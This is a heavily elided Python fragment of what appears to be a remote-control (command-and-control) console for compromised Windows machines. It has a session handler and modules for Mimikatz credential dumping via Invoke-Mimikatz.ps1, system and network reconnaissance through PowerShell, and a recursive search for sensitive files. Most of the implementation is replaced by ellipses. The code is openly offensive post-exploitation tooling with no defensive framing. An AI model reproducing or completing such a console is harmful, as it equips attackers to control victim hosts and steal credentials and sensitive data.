    ...
    def handle_client(self, client_socket, session_id):
        ...
        while True:
            try:
                ...
                if not message:
                    continue
                print(f"Raw message from session {session_id}: {message}")
    ...
    def console(self):
        ...
        modules = {
            ...
            "mimikatz": {
                ...
                "options": {
                    "script_path": r"C:\Path\To\Invoke-Mimikatz.ps1"
                }
            },
            "system_info": {
                "description": "系统信息收集",
            ...
            "file_search": {
                "description": "敏感文件路径信息收集",
                "options": {
                    "search_path": r"C:\SensitiveData"
                }
            }
        }
        commands = {
                    ...
                    if self.current_module and self.current_session:
                        ...
                        if self.current_module == "pre":
                            ...
                            if system == "windows":
                                ...
                                continue
                        elif self.current_module == "system_info":
                            if system == "windows":
                                ...
                                print("Unsupported system for system information collection")
                                continue
                        elif self.current_module == "network_info":
                            if system == "windows":
                                command = 'powershell -Command "Get-NetIPAddress; Get-NetRoute"'
                            else:
                                print("Unsupported system for network information collection")
                                continue
                        elif self.current_module == "file_search":
                            if system == "windows":
                                search_path = modules["file_search"]["options"]["search_path"]
                                command = f'powershell -Command "Get-ChildItem -Path {search_path} -Recurse"'
                            else:
                                print("Unsupported system for file search")
                                continue
                        else:
